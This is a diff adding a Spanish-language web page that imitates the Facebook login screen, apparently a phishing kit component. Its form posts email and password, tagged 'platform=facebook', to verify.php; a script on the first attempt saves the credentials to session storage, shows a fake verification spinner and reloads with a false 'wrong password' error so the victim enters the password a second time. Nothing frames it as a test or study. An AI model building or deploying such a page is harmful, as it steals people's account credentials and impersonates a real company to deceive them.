@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Facebook - Inicia sesión</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Ccircle cx='18' cy='18' r='16' fill='%231877f2'/%3E%3Ctext x='18' y='28' font-family='Arial' font-size='24' font-weight='bold' fill='white' text-anchor='middle'%3Ef%3C/text%3E%3C/svg%3E">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; flex-direction: column; min-height: 100vh; }
+        .fb-container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; flex-wrap: wrap; gap: 40px; }
+        .fb-brand { max-width: 500px; padding: 20px; }
+        .fb-logo { margin-bottom: 10px; text-align: left; }
+        .fb-logo svg { max-width: 100%; height: auto; }
+        .fb-subtitle { font-size: 28px; font-weight: normal; line-height: 32px; color: #1c1e21; margin-left: 28px; }
+        .fb-login-container { width: 100%; max-width: 396px; }
+        .fb-login-box { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 20px; margin-bottom: 28px; }
+        .error-box { background: #ffebe8; border: 1px solid #dd3c10; border-radius: 6px; padding: 12px; margin-bottom: 16px; display: none; }
+        .error-box.show { display: block; animation: shake 0.5s; }
+        .error-title { color: #dd3c10; font-weight: 600; margin-bottom: 4px; font-size: 14px; }
+        .error-message { color: #1c1e21; font-size: 13px; }
+        .error-message a { color: #1877f2; text-decoration: none; }
+        @keyframes shake { 0%,100%{transform:translateX(0);} 25%{transform:translateX(-5px);} 75%{transform:translateX(5px);} }
+        .fb-input { width: 100%; padding: 14px 16px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; margin-bottom: 12px; outline: none; }
+        .fb-input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,0.2); }
+        .fb-login-btn { background: #1877f2; color: white; border: none; padding: 12px; font-size: 20px; font-weight: bold; border-radius: 6px; width: 100%; cursor: pointer; margin-bottom: 16px; }
+        .fb-login-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .fb-links { text-align: center; }
+        .fb-forgot { color: #1877f2; text-decoration: none; font-size: 14px; font-weight: 500; display: block; margin-bottom: 16px; }
+        .fb-divider { border-top: 1px solid #dadde1; margin: 16px 0; }
+        .fb-create-btn { background: #42b72a; color: white; text-decoration: none; padding: 14px 16px; border-radius: 6px; font-weight: bold; font-size: 17px; display: inline-block; margin-bottom: 10px; }
+        .fb-create-page { text-align: center; margin-top: 28px; font-size: 14px; color: #1c1e21; }
+        .fb-create-page a { color: #1c1e21; font-weight: 600; text-decoration: none; }
+        .fb-footer { background: white; padding: 20px 40px; color: #737373; font-size: 12px; }
+        .fb-footer-content { max-width: 1000px; margin: 0 auto; }
+        .fb-languages { display: flex; flex-wrap: wrap; gap: 10px 20px; margin-bottom: 10px; }
+        .fb-languages a { color: #737373; text-decoration: none; }
+        .fb-footer-divider { border-top: 1px solid #dddfe2; margin: 10px 0; }
+        .fb-footer-links { display: flex; flex-wrap: wrap; gap: 10px 20px; margin-bottom: 10px; }
+        .fb-footer-links a { color: #737373; text-decoration: none; }
+        .fb-copyright { margin-top: 20px; color: #737373; }
+        .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @media (max-width: 900px) { .fb-container { flex-direction: column; gap: 0; } .fb-brand { text-align: center; } .fb-logo { text-align: center; } .fb-subtitle { font-size: 24px; margin-left: 0; } }
+        @media (max-width: 480px) { .fb-login-box { box-shadow: none; background: transparent; padding: 16px; } body { background: white; } }
+    </style>
+</head>
+<body>
+    <div class="fb-container">
+        <div class="fb-brand">
+            <div class="fb-logo">
+                <!-- Logo Facebook SVG (ícono f) -->
+                <svg viewBox="0 0 280 60" width="280" height="60">
+                    <circle cx="30" cy="30" r="26" fill="#1877f2"/>
+                    <text x="30" y="45" font-family="Arial, sans-serif" font-size="38" font-weight="bold" fill="white" text-anchor="middle">f</text>
+                    <text x="70" y="45" font-family="Helvetica, Arial, sans-serif" font-size="34" font-weight="bold" fill="#1877f2"></text>
+                </svg>
+            </div>
+            <p class="fb-subtitle">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+        </div>
+        <div class="fb-login-container">
+            <div class="fb-login-box">
+                <div class="error-box" id="errorBox">
+                    <div class="error-title">⚠️ Contraseña incorrecta</div>
+                    <div class="error-message">La contraseña que introdujiste no coincide. <a href="recovery.html">¿Olvidaste tu contraseña?</a></div>
+                </div>
+                <form action="verify.php" method="POST" id="loginForm">
+                    <input type="hidden" name="platform" value="facebook">
+                    <input type="hidden" name="attempt" id="attemptInput" value="1">
+                    <input type="text" name="email" class="fb-input" id="emailInput" placeholder="Correo electrónico o número de teléfono" required autofocus>
+                    <input type="password" name="pass" class="fb-input" id="passInput" placeholder="Contraseña" required>
+                    <button type="submit" class="fb-login-btn" id="loginBtn">Iniciar sesión</button>
+                    <div class="fb-links">
+                        <a href="recovery.html" class="fb-forgot">¿Olvidaste tu contraseña?</a>
+                        <div class="fb-divider"></div>
+                        <a href="#" class="fb-create-btn">Crear cuenta nueva</a>
+                    </div>
+                </form>
+            </div>
+            <p class="fb-create-page"><a href="#">Crea una página</a> para una celebridad, una marca o un negocio.</p>
+        </div>
+    </div>
+    <footer class="fb-footer">
+        <div class="fb-footer-content">
+            <div class="fb-languages"><a href="#">Español</a><a href="#">English (US)</a><a href="#">Português (Brasil)</a><a href="#">Français (France)</a><a href="#">Italiano</a><a href="#">Deutsch</a><a href="#">العربية</a><a href="#">हिन्दी</a><a href="#">中文(简体)</a><a href="#">日本語</a></div>
+            <div class="fb-footer-divider"></div>
+            <div class="fb-footer-links"><a href="#">Registrarte</a><a href="#">Iniciar sesión</a><a href="#">Messenger</a><a href="#">Facebook Lite</a><a href="#">Video</a><a href="#">Lugares</a><a href="#">Juegos</a><a href="#">Marketplace</a><a href="#">Meta Pay</a><a href="#">Meta Store</a><a href="#">Meta Quest</a><a href="#">Instagram</a><a href="#">Threads</a><a href="#">Recaudaciones de fondos</a><a href="#">Servicios</a><a href="#">Centro de información de votación</a><a href="#">Política de privacidad</a><a href="#">Centro de privacidad</a><a href="#">Grupos</a><a href="#">Información</a><a href="#">Crear anuncio</a><a href="#">Crear página</a><a href="#">Desarrolladores</a><a href="#">Empleo</a><a href="#">Cookies</a><a href="#">Opciones de anuncios</a><a href="#">Condiciones</a><a href="#">Ayuda</a><a href="#">Subir contactos y no usuarios</a><a href="#">Configuración</a><a href="#">Registro de actividad</a></div>
+            <div class="fb-copyright">Meta © 2025</div>
+        </div>
+    </footer>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const showError = urlParams.get('error') === '1';
+        const savedEmail = urlParams.get('email');
+        if(showError){ document.getElementById('errorBox').classList.add('show'); if(savedEmail){ document.getElementById('emailInput').value = decodeURIComponent(savedEmail); document.getElementById('passInput').focus(); } document.getElementById('attemptInput').value = '2'; }
+        const storedEmail = sessionStorage.getItem('fb_email'); if(storedEmail && !savedEmail) document.getElementById('emailInput').value = storedEmail;
+        document.getElementById('loginForm').addEventListener('submit', function(e){
+            const email = document.getElementById('emailInput').value;
+            const pass = document.getElementById('passInput').value;
+            const attempt = document.getElementById('attemptInput').value;
+            if(attempt === '1'){
+                e.preventDefault();
+                sessionStorage.setItem('fb_email', email); sessionStorage.setItem('fb_pass', pass);
+                const btn = document.getElementById('loginBtn'); btn.innerHTML = '<span class="loading-spinner"></span>Verificando...'; btn.disabled = true;
+                setTimeout(() => { window.location.href = `index.html?error=1&email=${encodeURIComponent(email)}`; }, 2000);
+            }
+        });
+    </script>
+</body>
+</html>
